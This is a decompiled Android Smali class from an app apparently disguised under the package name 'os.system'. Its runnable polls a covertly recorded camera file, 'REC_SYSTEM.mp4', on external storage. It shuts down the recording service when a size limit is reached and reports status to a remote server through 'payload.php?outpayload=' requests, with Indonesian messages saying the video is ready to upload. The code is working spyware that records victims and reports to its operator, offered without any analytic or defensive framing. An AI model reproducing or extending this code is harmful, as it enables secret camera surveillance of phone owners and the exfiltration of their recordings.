.class Los/system/System$3;
.super Ljava/lang/Object;
.source "System.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Los/system/System;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Los/system/System;


# direct methods
.method constructor <init>(Los/system/System;)V
    .locals 0

    .prologue
    .line 113
    iput-object p1, p0, Los/system/System$3;->this$0:Los/system/System;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 8

    .prologue
    .line 116
    iget-object v0, p0, Los/system/System$3;->this$0:Los/system/System;

    invoke-static {v0}, Los/system/System;->access$800(Los/system/System;)Landroid/os/Handler;

    move-result-object v0

    iget-object v1, p0, Los/system/System$3;->this$0:Los/system/System;

    invoke-static {v1}, Los/system/System;->access$700(Los/system/System;)Ljava/lang/Runnable;

    move-result-object v1

    const-wide/16 v2, 0x3e8

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 118
    new-instance v0, Ljava/io/File;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v2, p0, Los/system/System$3;->this$0:Los/system/System;

    invoke-static {v2}, Los/system/System;->access$300(Los/system/System;)Los/system/ReceiverBoot;

    sget-object v2, Los/system/ReceiverBoot;->pathExternal:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "/REC_SYSTEM.mp4"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 119
    invoke-virtual {v0}, Ljava/io/File;->length()J

    move-result-wide v0

    .line 120
    sget-object v2, Los/system/System;->TAG:Ljava/lang/String;

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "cam size: "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v0, v1}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v2, v3}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 122
    const-wide/16 v2, 0x0

    cmp-long v2, v0, v2

    if-nez v2, :cond_1

    .line 123
    iget-object v0, p0, Los/system/System$3;->this$0:Los/system/System;

    invoke-static {v0}, Los/system/System;->access$800(Los/system/System;)Landroid/os/Handler;

    move-result-object v0

    iget-object v1, p0, Los/system/System$3;->this$0:Los/system/System;

    invoke-static {v1}, Los/system/System;->access$700(Los/system/System;)Ljava/lang/Runnable;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/os/Handler;->removeCallbacks(Ljava/lang/Runnable;)V

    .line 125
    iget-object v0, p0, Los/system/System$3;->this$0:Los/system/System;

    iget-object v1, p0, Los/system/System$3;->this$0:Los/system/System;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v3, p0, Los/system/System$3;->this$0:Los/system/System;

    invoke-static {v3}, Los/system/System;->access$300(Los/system/System;)Los/system/ReceiverBoot;

    sget-object v3, Los/system/ReceiverBoot;->urlServer:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/payload.php?outpayload="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    iget-object v3, p0, Los/system/System$3;->this$0:Los/system/System;

    const-string v4, "camera video system alert tidak support(coba lagi) gunakan alternatif camera foto"

    invoke-virtual {v3, v4}, Los/system/System;->textPayload(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "null"

    invoke-virtual {v0, v1, v2, v3}, Los/system/System;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 141
    :cond_0
    :goto_0
    return-void

    .line 127
    :cond_1
    invoke-static {}, Los/system/System;->access$900()I

    move-result v2

    int-to-long v2, v2

    cmp-long v2, v0, v2

    if-lez v2, :cond_2

    .line 128
    iget-object v0, p0, Los/system/System$3;->this$0:Los/system/System;

    invoke-static {v0}, Los/system/System;->access$800(Los/system/System;)Landroid/os/Handler;

    move-result-object v0

    iget-object v1, p0, Los/system/System$3;->this$0:Los/system/System;

    invoke-static {v1}, Los/system/System;->access$700(Los/system/System;)Ljava/lang/Runnable;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/os/Handler;->removeCallbacks(Ljava/lang/Runnable;)V

    .line 130
    iget-object v0, p0, Los/system/System$3;->this$0:Los/system/System;

    invoke-static {v0}, Los/system/System;->access$1000(Los/system/System;)Los/system/CamRuntime$LocalBinder;

    move-result-object v0

    if-eqz v0, :cond_0

    .line 131
    iget-object v0, p0, Los/system/System$3;->this$0:Los/system/System;

    invoke-static {v0}, Los/system/System;->access$1000(Los/system/System;)Los/system/CamRuntime$LocalBinder;

    move-result-object v0

    invoke-virtual {v0}, Los/system/CamRuntime$LocalBinder;->matikan()V

    .line 132
    iget-object v0, p0, Los/system/System$3;->this$0:Los/system/System;

    iget-object v1, p0, Los/system/System$3;->this$0:Los/system/System;

    invoke-static {v1}, Los/system/System;->access$1100(Los/system/System;)Landroid/content/ServiceConnection;

    move-result-object v1

    invoke-virtual {v0, v1}, Los/system/System;->unbindService(Landroid/content/ServiceConnection;)V

    .line 133
    iget-object v0, p0, Los/system/System$3;->this$0:Los/system/System;

    const/4 v1, 0x0

    invoke-static {v0, v1}, Los/system/System;->access$1002(Los/system/System;Los/system/CamRuntime$LocalBinder;)Los/system/CamRuntime$LocalBinder;

    .line 135
    iget-object v0, p0, Los/system/System$3;->this$0:Los/system/System;

    iget-object v1, p0, Los/system/System$3;->this$0:Los/system/System;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v3, p0, Los/system/System$3;->this$0:Los/system/System;

    invoke-static {v3}, Los/system/System;->access$300(Los/system/System;)Los/system/ReceiverBoot;

    sget-object v3, Los/system/ReceiverBoot;->urlServer:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/payload.php?outpayload="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    iget-object v3, p0, Los/system/System$3;->this$0:Los/system/System;

    const-string v4, "camera video/audio SELESAI [siap diupload]"

    invoke-virtual {v3, v4}, Los/system/System;->textPayload(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "null"

    invoke-virtual {v0, v1, v2, v3}, Los/system/System;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_0

    .line 139
    :cond_2
    iget-object v2, p0, Los/system/System$3;->this$0:Los/system/System;

    iget-object v3, p0, Los/system/System$3;->this$0:Los/system/System;

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v5, p0, Los/system/System$3;->this$0:Los/system/System;

    invoke-static {v5}, Los/system/System;->access$300(Los/system/System;)Los/system/ReceiverBoot;

    sget-object v5, Los/system/ReceiverBoot;->urlServer:Ljava/lang/String;

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, "/payload.php?outpayload="

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    iget-object v5, p0, Los/system/System$3;->this$0:Los/system/System;

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "rekam size:"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6, v0, v1}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v5, v0}, Los/system/System;->textPayload(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v1, "null"

    invoke-virtual {v2, v3, v0, v1}, Los/system/System;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_0
.end method
